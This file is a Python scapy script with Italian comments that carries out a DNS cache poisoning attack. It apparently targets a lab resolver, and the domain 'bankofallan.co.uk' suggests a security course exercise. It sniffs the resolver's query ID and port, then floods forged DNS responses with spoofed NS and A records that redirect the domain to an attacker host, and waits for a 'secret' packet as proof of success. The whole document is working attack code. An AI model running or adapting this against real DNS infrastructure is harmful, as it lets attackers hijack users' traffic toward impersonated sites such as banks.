from scapy.layers.dns import *
from scapy.all import *
#from dnslib import *
from threading import Thread
import time

DNS_SPOOF_IP = "10.0.0.1"
VULN_DNS_IP = "192.168.56.101"
VULN_DNS_DPORT = 55553
FAKE_REQUEST = "spoofing.bankofallan.co.uk"
FAKE_DOMAIN = "bankofallan.co.uk"
BAD_DNS_IP = "192.168.56.1"

Q_ID = 0                # query ID globale
PORT_NUMBER = 0         # porta da catturare
GOAL = 0                # va a 1 se riesco nell'attacco
N_TRY = 1               # tentativi provati
PACKETS = []

class FirstThread(Thread):
        def __init__(self, name, job):
                Thread.__init__(self)
                self.name = name
                self.job = job

        def run(self):
                if self.job == 0:                                                       # sniffer
                        sniffer_job()

                if self.job == 1:                                                       # sender per badguy
                        sender_job()

                if self.job == 4:                                                       # in ascolto per il secret
                        secret_job()



def sender_job():
        '''
        invio la prima query DNS per badguy.ru
        :return:
        '''
        time.sleep(1)                                                                 # attendo che parta lo sniffer
        send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))

def sniffer_job():
        '''
        sniffo la query ricorsiva fatta all'host per badguy.ru
        catturo query ID e numero di porta
        :return:
        '''
        global Q_ID
        global PORT_NUMBER
        global GOAL

        raw = sniff(count=1, timeout=1, filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port " + str(VULN_DNS_DPORT))
        if GOAL == 0:
                raw_pkt = str(raw[0].getlayer(Raw))
                dns = DNS(raw_pkt)
                Q_ID = dns.id
                PORT_NUMBER = raw[0].getlayer(UDP).sport

def secret_job():
        '''
        attende il secret e aggiorna GOAL
        :return:
        '''
        global GOAL
        scrt_pkt = sniff(count=1, filter= "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337")
        scrt_pkt[0].show()
        GOAL = 1

def master_job():
        '''
        MAIN
        :return:
        '''

        global GOAL
        global Q_ID
        global PORT_NUMBER
        global N_TRY
        global PACKETS

        listener_thread = FirstThread(name="listener", job=4)
        listener_thread.start()

        while GOAL == 0:
                sniffer_thread = FirstThread(name="sniffer", job=0)
                sniffer_thread.start()

                sender_thread = FirstThread(name="sender", job=1)
                sender_thread.start()
                sender_thread.join()

                if Q_ID == 0 or PORT_NUMBER == 0:
                        sniffer_thread.join()
                        continue

                print ('\n\n\nTry # ' + str(N_TRY) +'\n[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))

                for index in range(1, 900):
                        pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                              DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                                  qdcount=1, ancount=0,
                                  nscount=1, arcount=1,
                                  qd=(DNSQR(qname=FAKE_REQUEST, qtype='A', qclass='IN')),
                                  an=None,
                                  ns=(DNSRR(rrname=FAKE_DOMAIN, type='NS', rclass='IN', ttl=60000, rdlen=24,
                                            rdata=FAKE_REQUEST)),
                                  ar=(DNSRR(rrname=FAKE_REQUEST, type='A', rclass='IN', ttl=60000, rdlen=4,
                                            rdata=BAD_DNS_IP)))
                        PACKETS.append(bytes(pkt))

                # richiesta
                query_sock.sendto((bytes(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname=FAKE_REQUEST)))), (VULN_DNS_IP, PORT_NUMBER))

                for pkt in PACKETS:
                        # flooding
                        flood_sock.sendto(pkt, (VULN_DNS_IP, PORT_NUMBER))

                PORT_NUMBER = 0
                Q_ID = 0
                N_TRY = N_TRY + 1
                PACKETS = []

        # GOAL viene visto al ciclo successivo se il listener e' lento
        listener_thread.join()
        print "Goal reached.\nEND"



############################ MAIN ###########################
# init socket
flood_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
query_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

master_job()